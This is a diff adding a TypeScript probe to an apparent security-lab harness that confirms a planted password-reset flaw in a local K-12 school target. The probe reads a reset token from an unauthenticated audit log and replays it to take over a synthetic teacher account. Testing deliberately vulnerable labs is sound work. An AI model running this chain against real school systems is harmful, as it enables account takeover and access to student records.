@@ -163,6 +163,50 @@ async function probeStudentSearchInjection() {
   return ["target: k12-student-search-injection", "student_search_query_injection: confirmed"]
 }
 
+async function probePasswordResetTokenLeak() {
+  const { proc, base } = await startTarget("k12-password-reset-token-leak")
+  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
+  if (!health.ok || health.lab !== "k12-password-reset-token-leak") fail(proc, "health probe failed")
+
+  const request = await fetch(`${base}/api/password-reset/request`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ email: "teacher-reset@district.test" }),
+  }).then((res) => res.json()) as { accepted?: boolean; account?: string; labFinding?: string | null }
+  if (!request.accepted || request.account !== "teacher-reset@district.test" || request.labFinding) {
+    fail(proc, "password reset request probe failed")
+  }
+
+  const audit = await fetch(`${base}/api/support/audit-log?account=teacher-reset@district.test`).then((res) =>
+    res.json(),
+  ) as { authenticated?: boolean; events?: Array<{ resetToken?: string }>; labFinding?: string }
+  const token = audit.events?.[0]?.resetToken
+  if (audit.authenticated || token !== "reset-lab-token-7142" || audit.labFinding !== "password_reset_token_leak") {
+    fail(proc, "audit log probe did not confirm reset token leak")
+  }
+
+  const complete = await fetch(`${base}/api/password-reset/complete`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({
+      account: "teacher-reset@district.test",
+      token,
+      password: "new-synthetic-password",
+    }),
+  }).then((res) => res.json()) as {
+    reset?: boolean
+    additionalVerification?: boolean
+    labFinding?: string
+  }
+  if (!complete.reset || complete.additionalVerification || complete.labFinding !== "password_reset_token_reuse") {
+    fail(proc, "reset completion probe did not confirm leaked token reuse")
+  }
+
+  proc.kill()
+  await proc.exited
+  return ["target: k12-password-reset-token-leak", "password_reset_token_leak: confirmed"]
+}
+
 const lines = [
   "ulm_lab_target: ok",
   ...(await probeMfaGap()),
@@ -170,6 +214,7 @@ const lines = [
   ...(await probeGradebookMassAssignment()),
   ...(await probeStorageConfigLeak()),
   ...(await probeStudentSearchInjection()),
+  ...(await probePasswordResetTokenLeak()),
 ]
 
 console.log(lines.join("\n"))
